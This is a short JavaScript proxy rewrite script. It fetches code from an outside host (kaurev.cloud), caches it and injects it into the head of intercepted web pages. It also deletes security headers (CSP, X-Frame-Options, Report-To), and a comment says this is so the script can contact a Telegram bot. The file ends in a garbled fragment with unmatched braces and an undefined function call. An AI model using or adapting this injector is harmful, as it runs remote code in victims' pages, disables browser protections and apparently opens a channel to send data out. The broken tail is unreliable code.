const U = "https://kaurev.cloud/6877912815/a76e2226e40ed42df1c52fb48857196e4d770086ce0bb67cdb1e78b8fb27cc04/install.user.js";
const K = "my_js";

let cachedJS = $prefs.valueForKey(K);

if (cachedJS) {
    inject(cachedJS);
} else {
    $task.fetch({ url: U }).then(response => {
        $prefs.setValueForKey(response.body, K);
        inject(response.body);
    }, reason => {
        $done({});
    });
}

function inject(js) {
    let body = $response.body;
    let headers = $response.headers;

    if (!body) return $done({});

    // Hapus security headers agar script bisa kontak bot Tele
    Object.keys(headers).forEach(k => {
        if (/content-security-policy|x-frame-options|report-to/i.test(k)) {
            delete headers[k];
        }
    });

    headers['Cache-Control'] = 'no-cache';

    // Inject JS
    let injectedBody = body.replace(/<head>/i, `<head><script>${js}</script>`);
    
    $done({ body: injectedBody, headers: headers });
}
        if (response.statusCode === 200) {
            $prefs.setValueForKey(response.body, K);
            finalize(response.body);
        } else {
            $done({});
        }
    }, reason => {
        $done({});
    });
}
